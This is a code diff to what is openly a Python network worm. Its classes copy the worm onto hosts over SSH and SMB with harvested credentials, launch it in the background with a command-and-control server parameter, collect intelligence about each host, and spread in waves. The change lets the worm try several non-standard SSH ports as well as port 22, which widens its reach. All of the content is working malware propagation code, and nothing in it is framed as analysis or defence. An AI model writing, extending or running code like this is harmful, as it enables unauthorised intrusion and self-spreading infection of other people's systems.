@@ -193,7 +193,7 @@ class SelfCopyTransfer:
     REMOTE_PATH_WINDOWS = r"C:\Windows\Temp\svc.py"
 
     def transfer_via_ssh(
-        self, target_ip: str, username: str, password: str, c2_server: str = None
+        self, target_ip: str, username: str, password: str, c2_server: str = None, port: int = 22
     ) -> bool:
         """
         SCP worm to target Linux host and run it in background.
@@ -204,7 +204,7 @@ class SelfCopyTransfer:
 
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(target_ip, username=username, password=password, timeout=10)
+            ssh.connect(target_ip, port=port, username=username, password=password, timeout=10)
 
             # Transfer via SFTP
             sftp = ssh.open_sftp()
@@ -221,12 +221,12 @@ class SelfCopyTransfer:
             ssh.exec_command(cmd)
             ssh.close()
 
-            logger.success(f"Worm transferred and launched on {target_ip} via SSH")
+            logger.success(f"Worm transferred and launched on {target_ip}:{port} via SSH")
             return True
         except ImportError:
             logger.warning("paramiko required for SSH transfer")
         except Exception as e:
-            logger.debug(f"SSH transfer to {target_ip} failed: {e}")
+            logger.debug(f"SSH transfer to {target_ip}:{port} failed: {e}")
         return False
 
     def transfer_via_smb(
@@ -295,7 +295,7 @@ class IntelHarvester:
         "installed_pkgs": "dpkg -l 2>/dev/null | head -20 || rpm -qa 2>/dev/null | head -20",
     }
 
-    def harvest(self, target_ip: str, username: str, password: str) -> Dict:
+    def harvest(self, target_ip: str, username: str, password: str, port: int = 22) -> Dict:
         """SSH to target and collect intel."""
         intel = {"target": target_ip, "username": username}
         try:
@@ -303,7 +303,7 @@ class IntelHarvester:
 
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(target_ip, username=username, password=password, timeout=10)
+            ssh.connect(target_ip, port=port, username=username, password=password, timeout=10)
 
             for key, cmd in self.COMMANDS.items():
                 try:
@@ -338,12 +338,12 @@ class IntelHarvester:
             intel["estimated_asset_value"] = min(100, asset_value)
 
             ssh.close()
-            logger.success(f"Intel harvested from {target_ip}: {list(intel.keys())}")
+            logger.success(f"Intel harvested from {target_ip}:{port}: {list(intel.keys())}")
 
         except ImportError:
             logger.warning("paramiko required for intel harvesting")
         except Exception as e:
-            logger.debug(f"Intel harvest on {target_ip} failed: {e}")
+            logger.debug(f"Intel harvest on {target_ip}:{port} failed: {e}")
 
         return intel
 
@@ -451,6 +451,9 @@ class WavePropagationEngine:
         """Try to infect a single target."""
         ip = target.get("ip")
         result = {"ip": ip, "wave": wave, "success": False}
+        target_ports = target.get("open_ports", [])
+        ssh_ports = (22, 2222, 2200, 2022, 8022)
+        ssh_port = next((p for p in target_ports if p in ssh_ports), 22)
 
         # Run the exploit function
         try:
@@ -461,14 +464,14 @@ class WavePropagationEngine:
                 # Try to extract usable credentials
                 for user, pwd in credentials:
                     # Attempt SSH self-copy
-                    if 22 in target.get("open_ports", []):
-                        transferred = self.self_copy.transfer_via_ssh(ip, user, pwd, c2_server)
+                    if any(p in ssh_ports for p in target_ports):
+                        transferred = self.self_copy.transfer_via_ssh(ip, user, pwd, c2_server, port=ssh_port)
                         if transferred:
                             result["self_copied"] = True
                             result["credentials"] = (user, pwd)
                             break
                     # Attempt SMB self-copy
-                    if 445 in target.get("open_ports", []):
+                    if 445 in target_ports:
                         transferred = self.self_copy.transfer_via_smb(ip, user, pwd)
                         if transferred:
                             result["self_copied"] = True
